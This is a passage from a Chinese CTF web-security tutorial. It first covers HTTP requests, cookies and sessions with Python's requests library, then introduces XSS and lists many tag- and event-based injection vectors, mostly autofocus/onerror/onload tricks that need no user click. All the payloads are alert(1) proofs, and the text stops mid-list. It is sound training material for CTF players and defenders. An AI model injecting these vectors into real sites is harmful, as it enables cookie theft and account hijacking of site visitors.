string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span> <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看请求头的某一属性：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Accept-Encoding'</span><span class="token punctuation">]</span>'gzip<span class="token punctuation">,</span> deflate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><h6 id="查看响应头"><a href="#查看响应头" class="headerlink" title="查看响应头"></a>查看响应头</h6></li></ul><p>对 Github 官网发起请求，以查看 GET 请求的响应头为例，POST 请求同理：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">{</span><span class="token string">'Status'</span><span class="token punctuation">:</span> <span class="token string">'200 OK'</span><span class="token punctuation">,</span> <span class="token string">'Expect-CT'</span><span class="token punctuation">:</span> '<span class="token builtin">max</span><span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">2592000</span><span class="token punctuation">,</span> report<span class="token operator">-</span>uri<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看响应头的某一属性：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Status'</span><span class="token punctuation">]</span><span class="token string">'200 OK'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><h6 id="查看响应内容"><a href="#查看响应内容" class="headerlink" title="查看响应内容"></a>查看响应内容</h6></li></ul><p>对 Github 官网发起请求，查看服务器返回页面的内容，以查看 GET 请求的响应内容为例，POST 请求同理：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>textu'\n\n\n\n\n\n<span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">&gt;</span>\n  <span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>\n    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">&gt;</span>\n<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h6 id="传递-GET-请求参数"><a href="#传递-GET-请求参数" class="headerlink" title="传递 GET 请求参数"></a>传递 GET 请求参数</h6></li></ul><p>GET 请求参数作为查询字符串附加在 URL 末尾，可以通过 <code>requests.get()</code> 方法中的 <code>params</code> 参数完成。例如，我要构建的 URL 为 <code>https://github.com/?username=ciphersaw&amp;id=1</code>，则可以通过以下代码传递 GET 请求参数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> args <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'ciphersaw'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">,</span> params <span class="token operator">=</span> args<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>url<span class="token punctuation">)</span>https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>?username<span class="token operator">=</span>ciphersaw<span class="token operator">&amp;</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>params</code> 参数是 <code>dict</code> 类型变量。可以看到，带有请求参数的 URL 确实构造好了，不过注意，这里的 <code>username</code> 和 <code>id</code> 是为了说明问题任意构造的，传入 Github 官网后不起作用，下同。</p><ul><li><h6 id="传递-POST-请求参数"><a href="#传递-POST-请求参数" class="headerlink" title="传递 POST 请求参数"></a>传递 POST 请求参数</h6></li></ul><p>POST 请求参数以表单数据的形式传递，可以通过 <code>requests.post()</code> 方法中的 <code>data</code> 参数完成，具体代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> args <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'ciphersaw'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">,</span> data <span class="token operator">=</span> args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中 <code>data</code> 参数也是 <code>dict</code> 类型变量。由于 POST 请求参数不以明文展现，在此省略验证步骤。</p><ul><li><h6 id="传递-Cookie-参数"><a href="#传递-Cookie-参数" class="headerlink" title="传递 Cookie 参数"></a>传递 Cookie 参数</h6></li></ul><p>如果想传递自定义 Cookie 到服务器，可以使用 <code>cookies</code> 参数。以 POST 请求为例向 Github 官网提交自定义 Cookie（<code>cookies</code> 参数同样适用于 GET 请求）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> mycookie <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'userid'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">}</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">,</span> cookies <span class="token operator">=</span> mycookie<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'userid=123456'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>cookies</code> 参数也是 <code>dict</code> 类型变量。可以看到，POST 请求的请求头中确实包含了自定义 Cookie。</p><ul><li><h6 id="会话对象-Session"><a href="#会话对象-Session" class="headerlink" title="会话对象 Session()"></a>会话对象 Session()</h6></li></ul><p>Session 是存储在服务器上的相关用户信息，用于在有效期内保持客户端与服务器之间的状态。Session 与 Cookie 配合使用，当 Session 或 Cookie 失效时，客户端与服务器之间的状态也随之失效。</p><p> Session 的大致原理：</p><p>Session 的中文翻译为：「会话」，只属于某一个客户端和某一个服务器端沟通的工具。鉴于 HTTP 是无状态协议，之前已认证成功的用户状态是无法通过协议层面保存下来的，既，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他和其他的用户。于是我们会使用 Cookie 来管理 Session，以弥补 HTTP 协议中不存在的状态管理功能。</p><ul><li>客户端把用户 ID 和密码等登录信息放入报文的实体部分，通常是以 POST 方法把请求发送给服务器。</li><li>服务器会发放用以识别用户的 Session ID。通过验证从客户端发送过来的登录信息进行身份验证，然后把用户的认证状态与 Session ID 绑定后记录在服务器端。向客户端返回响应时，会在首部字段 Set-Cookie 内写入 Session ID。</li><li>客户端接收到从服务器端发来的 Session ID 后，会将其作为 Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送 Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证接收到的 Session ID 识别用户和其认证状态。</li></ul><p><img src="https://i.loli.net/2021/08/04/QTto26CEbIu5JgZ.jpg"></p><p>有关 Session 的原理可参见以下文章：</p><blockquote><p><a href="http://blog.csdn.net/yunnysunny/article/details/26935637">session的根本原理及安全性</a><br><a href="http://www.jianshu.com/p/2b7c10291aad">Session原理</a></p></blockquote><p>requests 模块中的 会话对象 Session() 能够在多次请求中保持某些参数，使得底层的 TCP 连接将被重用，提高了 HTTP 连接的性能。</p><p>Session() 的创建过程如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在有效期内，同一个会话对象发出的所有请求都保持着相同的 Cookie，可以看出，会话对象也可以通过 <code>get</code> 与 <code>post</code> 方法发送请求，以发送 GET 请求为例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考例题：</p><p><a href="https://ctf.bugku.com/challenges/detail/id/86.html#%E3%80%90Bugku-CTF%E3%80%91-Web-%E2%80%94%E2%80%94-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB">速度要快</a></p><p><a href="https://ctf.bugku.com/challenges/detail/id/85.html#%E3%80%90Bugku-CTF%E3%80%91-Web-%E2%80%94%E2%80%94-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA">秋名山车神</a></p><h3 id="第5大类-XSS"><a href="#第5大类-XSS" class="headerlink" title="第5大类-XSS"></a>第5大类-XSS</h3><p><strong>XSS简介</strong></p><p>XSS，全称Cross Site  Scripting，即跨站脚本攻击，是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据攻击代码的工作方式，XSS可以分为反射型的XSS、存储型的XSS和DOM型的XSS。 </p><ul><li><strong>反射型</strong></li></ul><p>反射型的XSS是非持久化的，攻击者事先制作好攻击链接，需要欺骗用户自己去点击链接才能触发XSS代码，但是服务器中没有这样的页面和内容，一般容易出现在搜索页面。</p><ul><li><strong>存储型</strong></li></ul><p>存储型的XSS是持久化的，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行。这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。</p><ul><li><strong>DOM型</strong></li></ul><p>DOM型的XSS是基于文档对象模型Document Objeet  Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI  ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM  XSS漏洞。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p><p><strong>一些常用的标签与属性</strong></p><ul><li><p><strong>scirpt 标签</strong></p><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>img 标签</strong></p><p><code>&lt;img&gt; </code>标签定义 HTML 页面中的图像</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span>&lt;img src=1 onerror=alert("xss");&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>input 标签</strong></p><p><code>&lt;input&gt;</code> 标签规定了用户可以在其中输入数据的输入字段。</p><p>onfocus 事件在对象获得焦点时发生：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>竞争焦点，从而触发onblur事件：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onblur</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">autofocus</span><span class="token punctuation">&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>input 标签的 autofocus 属性规定当页面加载时 <code>&lt;input&gt;</code> 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>details 标签</strong></p><p><code>&lt;details&gt;</code> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <code>&lt;details&gt;</code> 元素时触发：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>details</span> <span class="token attr-name">ontoggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1);</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>details</span> <span class="token attr-name">open</span> <span class="token attr-name">ontoggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1);</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>svg 标签</strong></p><p><code>&lt;svg&gt; </code>标签用来在HTML页面中直接嵌入SVG 文件的代码。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>select 标签</strong></p><p><code>&lt;select&gt;</code> 标签用来创建下拉列表。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>iframe 标签</strong></p><p><code>&lt;iframe&gt;</code> 标签会创建包含另外一个文档的内联框架。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>video 标签</strong></p><p><code>&lt;video&gt;</code> 标签定义视频，比如电影片段或其他视频流。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>audio 标签</strong></p><p><code>&lt;audio&gt;</code> 标签定义声音，比如音乐或其他音频流。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span>  <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>body 标签</strong></p><p><code>&lt;body&gt;</code> 标签定义文档的主体。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token special-attr"><span class="token attr-name">onscroll</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">autofocus</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>textarea 标签</strong></p><p><code>&lt;textarea&gt;</code> 标签定义一个多行的文本输入控件。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>keygen 标签</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>keygen</span> <span class="token attr-name">autofocus</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">&gt;</span></span> //仅限火狐<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>marquee 标签</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>marquee</span> <span class="token attr-name">onstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1)</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>marquee</span><span class="token punctuation">&gt;</span></span> //Chrome不行，火狐和IE都可以<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>isindex 标签</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>isindex</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>image</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span 